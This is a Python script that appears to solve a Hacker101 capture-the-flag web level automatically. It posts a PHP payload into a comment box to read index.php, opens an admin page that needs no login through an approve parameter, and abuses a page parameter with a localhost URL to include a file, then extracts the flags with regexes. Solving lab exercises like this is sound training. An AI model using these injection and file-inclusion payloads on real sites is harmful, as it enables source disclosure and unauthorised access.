# Importing Packages #
from requests import get as get_request, post as post_request
from re import search as search_flag
# Getting CTF URL #
ctf_url = f"https://{input("\033[32m[1] Enter your ctf id: \033[0m")}.ctf.hacker101.com"
# Declaring Flags list #
FLAGS = []
# Handling Exceptions #
try:
    # Checking for correct ctf id #
    if get_request(ctf_url).status_code == 200:
        # Printing Message before featching all flags #
        print("\033[33m[2] Please wait while we featch all flags.\033[0m")
        # Getting Flag 1 by injecting php payload in comment box #
        FLAGS.append(f'^FLAG^{search_flag(r"\^FLAG\^(.*?)\$FLAG\$", post_request(ctf_url, data = {'body': '<?php echo readfile("index.php")?>'}).text).group(1)}$FLAG$')
        # Getting Flag 2 by opening admin page which doent require login #
        FLAGS.append(f'^FLAG^{search_flag(r"\^FLAG\^(.*?)\$FLAG\$", get_request(f'{ctf_url}?page=admin.inc&approve=2').text).group(1)}$FLAG$')
        # Getting Flag 1 by injecting php payload in comment box  to readfile index.php #
        FLAGS.append(f'^FLAG^{search_flag(r"// \^FLAG\^(.*?)\$FLAG\$", get_request(f'{ctf_url}/?page=http://localhost/index').text).group(1)}$FLAG$')
    else:
        print("\033[33m[2] Wrong ctf id check and try again.\033[0m")
except Exception as e:
    # Printing Exception #
    print(f"\033[31m[3] {str(e)}\033[0m")
# Printing all the flags #
print(f"\033[32m[3] Your flags are: {FLAGS}\033[0m")